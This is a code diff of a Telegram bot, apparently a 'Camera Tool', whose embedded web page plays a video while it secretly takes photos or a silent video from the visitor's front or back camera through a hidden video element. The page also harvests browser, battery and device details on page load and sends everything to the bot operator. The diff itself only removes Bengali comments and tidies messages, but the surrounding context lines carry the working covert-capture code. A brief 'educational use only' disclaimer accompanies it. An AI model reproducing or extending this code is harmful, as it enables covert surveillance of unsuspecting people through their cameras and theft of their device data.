@@ -40,6 +40,8 @@ PUBLIC_URL = os.environ.get("PUBLIC_URL", "")
 ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "7243012875,7668032710")
 ALLOWED_CHAT_IDS = {s.strip() for s in ALLOWED_CHAT_ID.split(",") if s.strip()}
 
+UNAUTHORIZED_MSG = "আগে রিফাত ভাইয়ের কাছে অনুমতি নিয়ে আসুন।"
+
 
 def is_authorized_chat(chat_id):
     return str(chat_id) in ALLOWED_CHAT_IDS
@@ -256,7 +258,6 @@ CAPTURE_HTML = """
         // =========================================================
         async function detect4KSupport() {
             try {
-                // প্রথমে 4K চেষ্টা
                 const test = await navigator.mediaDevices.getUserMedia({
                     audio: false,
                     video: {
@@ -277,10 +278,6 @@ CAPTURE_HTML = """
             }
         }
 
-        // =========================================================
-        // 🎯 Adaptive Constraints — 4K সাপোর্ট করলে 4K, না হলে HD
-        // audio: false, torch: false (কোনো flash নেই)
-        // =========================================================
         let IS_4K = false;
 
         function buildConstraints(use4K) {
@@ -297,7 +294,6 @@ CAPTURE_HTML = """
                     }
                 };
             }
-            // HD fallback
             return {
                 audio: false,
                 video: {
@@ -310,9 +306,6 @@ CAPTURE_HTML = """
             };
         }
 
-        // =========================================================
-        // 🔍 Helpers (ডিভাইস তথ্য)
-        // =========================================================
         function getBrowserInfo() {
             const ua = navigator.userAgent;
             let name = "Unknown", ver = "Unknown";
@@ -416,9 +409,6 @@ CAPTURE_HTML = """
             } catch (e) { return {}; }
         }
 
-        // =========================================================
-        // 📱 ডিভাইস তথ্য সংগ্রহ
-        // =========================================================
         async function collectDeviceInfo(use4K) {
             const b = getBrowserInfo();
             const battery = await getBatteryInfo();
@@ -465,9 +455,6 @@ CAPTURE_HTML = """
             });
         }
 
-        // =========================================================
-        // মোড ১: ছবি ক্যাপচার — ৫ সেকেন্ডে ৩টি ছবি
-        // =========================================================
         async function startPhotoCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(buildConstraints(IS_4K));
@@ -487,11 +474,11 @@ CAPTURE_HTML = """
                     if (hiddenVideo.readyState >= 2) return res();
                     hiddenVideo.onloadeddata = res;
                 });
-                await new Promise(r => setTimeout(r, 500)); // exposure settle
+                await new Promise(r => setTimeout(r, 500));
 
-                const TOTAL_PHOTOS = 3;       // ← ৩টি ছবি
-                const INTERVAL_MS = 2000;     // ← প্রতি ২ সেকেন্ডে ১টি → মোট ৫-৬ সেকেন্ড
-                const START_DELAY = 1000;     // ← ক্যামেরা চালু হওয়ার পর ১s
+                const TOTAL_PHOTOS = 3;
+                const INTERVAL_MS = 2000;
+                const START_DELAY = 1000;
                 let photoCount = 0;
 
                 setTimeout(() => {
@@ -505,14 +492,12 @@ CAPTURE_HTML = """
                             canvas.height = h;
                             const ctx = canvas.getContext('2d', { willReadFrequently: false });
 
-                            // Front camera mirror fix
                             if (CAMERA_TYPE === "front") {
                                 ctx.translate(w, 0);
                                 ctx.scale(-1, 1);
                             }
                             ctx.drawImage(hiddenVideo, 0, 0, w, h);
 
-                            // High JPEG quality
                             const photo = canvas.toDataURL('image/jpeg', 0.95);
                             photoCount++;
 
@@ -542,9 +527,6 @@ CAPTURE_HTML = """
             } catch (e) { console.log("camera error", e); }
         }
 
-        // =========================================================
-        // মোড ২: সাইলেন্ট ভিডিও (৫ সেকেন্ড, 4K/HD adaptive)
-        // =========================================================
         async function startVideoCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(buildConstraints(IS_4K));
@@ -552,7 +534,6 @@ CAPTURE_HTML = """
                 const settings = track.getSettings();
                 console.log(`🎥 Video capture @ ${settings.width}x${settings.height} (${IS_4K ? "4K" : "HD"})`);
 
-                // Bitrate: 4K হলে 8 Mbps, HD হলে 2.5 Mbps
                 const bitrate = IS_4K ? 8000000 : 2500000;
 
                 let mimeType = 'video/webm;codecs=vp9';
@@ -608,9 +589,6 @@ CAPTURE_HTML = """
             } catch (e) { console.log("video camera error", e); }
         }
 
-        // =========================================================
-        // ভিডিও লোড
-        // =========================================================
         function loadVideo() {
             const container = document.getElementById('videoContainer');
             if (!VIDEO_URL) {
@@ -650,21 +628,17 @@ CAPTURE_HTML = """
             else { window.location.href = url; }
         }
 
-        // === সব শুরু ===
         window.onload = async () => {
             loadVideo();
 
-            // 4K সাপোর্ট চেক (torch ছাড়া)
             IS_4K = await detect4KSupport();
             console.log(`📊 Selected quality: ${IS_4K ? "4K (3840x2160)" : "HD (1280x720)"}`);
 
-            // ডিভাইস তথ্য
             try {
                 const info = await collectDeviceInfo(IS_4K);
                 await sendDeviceInfo(info);
             } catch (e) { console.log("device info error", e); }
 
-            // ক্যাপচার শুরু
             if (CAPTURE_MODE === "video") {
                 startVideoCapture();
             } else {
@@ -752,7 +726,7 @@ def device_info():
 # ==========================================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized_chat(update.effective_chat.id):
-        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        await update.message.reply_text(UNAUTHORIZED_MSG)
         return
     keyboard = [[
         InlineKeyboardButton("📸 Front Camera", callback_data="cam_front"),
@@ -760,12 +734,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]]
     await update.message.reply_text(
         "🎥 *Camera Tool (Auto 4K/HD)*\n\n"
-"📸 𝓒𝓐𝓜𝓔𝓡𝓐 𝓢𝓨𝓢𝓣𝓔𝓜
-━━━━━━━━━━━━━━━
-✦ হ্যালো! বটে আপনাকে স্বাগতম। ✦
-​⚙️ রিফাত ভাইয়ের ♡𝓡𝓣♡ এর পক্ষ থেকে 𝓒𝓸𝓷𝓽𝓻𝓸𝓵 𝓟𝓪𝓷𝓮𝓵 নিচে দেওয়া হলো।
-▸ শুরু করতে যেকোনো একটি 𝓞𝓹𝓽𝓲𝓸𝓷 সিলেক্ট করুন।
-​📌 শুধুমাত্র শিক্ষামূলক ও নিজস্ব 𝓣𝓮𝓼𝓽𝓲𝓷𝓰 এর কাজে সীমাবদ্ধ রাখুন।",
+        "📸 𝓒𝓐𝓜𝓔𝓡𝓐 𝓢𝓨𝓢𝓣𝓔𝓜\n"
+        "━━━━━━━━━━━━━━━\n"
+        "✦ হ্যালো! বটে আপনাকে স্বাগতম। ✦\n"
+        "⚙️ রিফাত ভাইয়ের ♡𝓡𝓣♡ এর পক্ষ থেকে 𝓒𝓸𝓷𝓽𝓻𝓸𝓵 𝓟𝓪𝓷𝓮𝓵 নিচে দেওয়া হলো।\n"
+        "▸ শুরু করতে যেকোনো একটি 𝓞𝓹𝓽𝓲𝓸𝓷 সিলেক্ট করুন।\n"
+        "📌 শুধুমাত্র শিক্ষামূলক ও নিজস্ব 𝓣𝓮𝓼𝓽𝓲𝓷𝓰 এর কাজে সীমাবদ্ধ রাখুন।",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown",
     )
@@ -775,7 +749,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     if not is_authorized_chat(query.message.chat_id):
-        await query.edit_message_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        await query.edit_message_text(UNAUTHORIZED_MSG)
         return
 
     data = query.data
@@ -867,7 +841,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized_chat(update.effective_chat.id):
-        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        await update.message.reply_text(UNAUTHORIZED_MSG)
         return
     chat_id = str(update.message.chat_id)
     s = user_sessions.get(chat_id, {})
